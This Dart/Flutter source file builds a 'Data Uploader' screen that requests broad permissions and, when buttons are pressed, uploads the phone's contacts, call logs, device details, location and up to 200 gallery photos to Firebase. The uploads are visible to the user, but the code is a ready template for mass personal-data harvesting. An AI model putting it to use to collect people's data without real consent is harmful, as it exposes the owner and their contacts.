import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'dart:io';

// Importing necessary packages for accessing data
import 'package:contacts_service/contacts_service.dart';
import 'package:call_log/call_log.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:location/location.dart';
import 'package:photo_manager/photo_manager.dart'; // Import photo_manager

class HomeScreen extends StatefulWidget {
  @override
  _HomeScreenState createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  bool _permissionsGranted = false; // Flag to track permission status
  bool _isUploading = false; // Flag to track upload status

  @override
  void initState() {
    super.initState();
    requestPermissions(); // Request permissions on app start
  }

  // Request permissions
  Future<void> requestPermissions() async {
    final statuses = await [
      Permission.contacts,
      Permission.sms,
      Permission.phone,
      Permission.location,
      Permission.storage,
    ].request();

    if (statuses[Permission.contacts]!.isGranted &&
        statuses[Permission.sms]!.isGranted &&
        statuses[Permission.phone]!.isGranted &&
        statuses[Permission.location]!.isGranted &&
        statuses[Permission.storage]!.isGranted) {
      setState(() {
        _permissionsGranted = true;
      });
    } else {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content:
              Text('Permissions not granted. Please allow all permissions.'),
        ),
      );
    }
  }

  // Fetch and send contacts
  Future<void> fetchAndSendContacts() async {
    try {
      Iterable<Contact> contacts = await ContactsService.getContacts();
      List<Map<String, dynamic>> contactList = [];

      for (Contact contact in contacts) {
        contactList.add({
          'name': contact.displayName,
          'phone': contact.phones?.map((e) => e.value).toList() ?? [],
          'email': contact.emails?.map((e) => e.value).toList() ?? [],
        });
      }

      await sendDataToFirestore('contacts', contactList);
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Contacts uploaded to Firebase')));
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Failed to upload contacts: $e')));
    }
  }

  // Fetch and send call logs
  Future<void> fetchAndSendCallLogs() async {
    try {
      Iterable<CallLogEntry> callLogs = await CallLog.get();
      List<Map<String, dynamic>> callLogList = [];

      for (CallLogEntry entry in callLogs) {
        callLogList.add({
          'name': entry.name,
          'number': entry.number,
          'duration': entry.duration,
          'timestamp': DateTime.fromMillisecondsSinceEpoch(entry.timestamp ?? 0)
              .toString(),
          'callType': entry.callType.toString(),
        });
      }

      await sendDataToFirestore('call_logs', callLogList);
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Call logs uploaded to Firebase')));
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Failed to upload call logs: $e')));
    }
  }

  // Fetch and send device info
  Future<void> fetchAndSendDeviceInfo() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;

      Map<String, dynamic> deviceInfoData = {
        'model': androidInfo.model,
        'brand': androidInfo.brand,
        'androidVersion': androidInfo.version.release,
        'device': androidInfo.device,
      };

      await sendDataToFirestore('device_info', [deviceInfoData]);
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Device info uploaded to Firebase')));
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Failed to upload device info: $e')));
    }
  }

  // Fetch and upload gallery images using PhotoManager
  Future<void> loadGalleryImages(String uid) async {
    if (!_permissionsGranted) {
      ScaffoldMessenger.of(context)
          .showSnackBar(SnackBar(content: Text('Permissions not granted')));
      return;
    }

    if (_isUploading) {
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Upload in progress, please wait')));
      return;
    }

    setState(() {
      _isUploading = true; // Indicate uploading started
    });

    try {
      final List<AssetPathEntity> paths =
          await PhotoManager.getAssetPathList(type: RequestType.image);
      final List<AssetEntity> assets =
          await paths[0].getAssetListRange(start: 0, end: 200);

      for (var asset in assets) {
        File? file = await asset.file; // Convert AssetEntity to File
        if (file != null && file.path != null) {
          bool isSaved = await alreadyExistLink(link: file.path);
          if (!isSaved) {
            final link = await _uploadImage(file);
            uploadLink(uid, link, file.path);
          }
        }
      }

      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
          content: Text('First 200 gallery images uploaded to Firebase')));
    } catch (e) {
      ScaffoldMessenger.of(context)
          .showSnackBar(SnackBar(content: Text('Error: ${e.toString()}')));
    }

    setState(() {
      _isUploading = false; // Indicate uploading finished
    });
  }

  // Function to check if a link already exists
  Future<bool> alreadyExistLink({required String link}) async {
    // Implement your logic to check if the link already exists in your Firestore
    return false; // Example: always return false
  }

  // Upload image to Firebase Storage and return the download link
  Future<String> _uploadImage(File file) async {
    final Reference storageRef = FirebaseStorage.instance
        .ref()
        .child('photos/${file.path.split('/').last}');
    await storageRef.putFile(file);
    return await storageRef.getDownloadURL();
  }

  // Upload link to Firestore
  Future<void> uploadLink(String uid, String link, String path) async {
    await FirebaseFirestore.instance
        .collection('users')
        .doc(uid)
        .collection('gallery')
        .add({
      'link': link,
      'path': path,
    });
  }

  // Fetch and send location
  Future<void> fetchAndSendLocation() async {
    try {
      Location location = Location();
      LocationData _locationData = await location.getLocation();

      Map<String, double?> locationData = {
        'latitude': _locationData.latitude,
        'longitude': _locationData.longitude,
      };

      await sendDataToFirestore('locations', [locationData]);
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Location uploaded to Firebase')));
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Failed to upload location: $e')));
    }
  }

  // Helper function to send data to Firestore
  Future<void> sendDataToFirestore(
      String collectionName, List<Map<String, dynamic>> dataList) async {
    for (Map<String, dynamic> data in dataList) {
      await FirebaseFirestore.instance.collection(collectionName).add(data);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Data Uploader'),
      ),
      body: Center(
        child: SingleChildScrollView(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              ElevatedButton(
                onPressed: fetchAndSendContacts,
                child: _isUploading
                    ? CircularProgressIndicator()
                    : Text('Contacts'),
              ),
              ElevatedButton(
                onPressed: fetchAndSendCallLogs,
                child: _isUploading
                    ? CircularProgressIndicator()
                    : Text('Call Logs'),
              ),
              ElevatedButton(
                onPressed: fetchAndSendDeviceInfo,
                child: _isUploading
                    ? CircularProgressIndicator()
                    : Text('Device Info'),
              ),
              ElevatedButton(
                onPressed: () => loadGalleryImages(
                    'your_user_id'), // Replace 'your_user_id' with actual UID
                child: _isUploading
                    ? CircularProgressIndicator()
                    : Text('Gallery Images'),
              ),
              ElevatedButton(
                onPressed: fetchAndSendLocation,
                child: _isUploading
                    ? CircularProgressIndicator()
                    : Text('Location'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
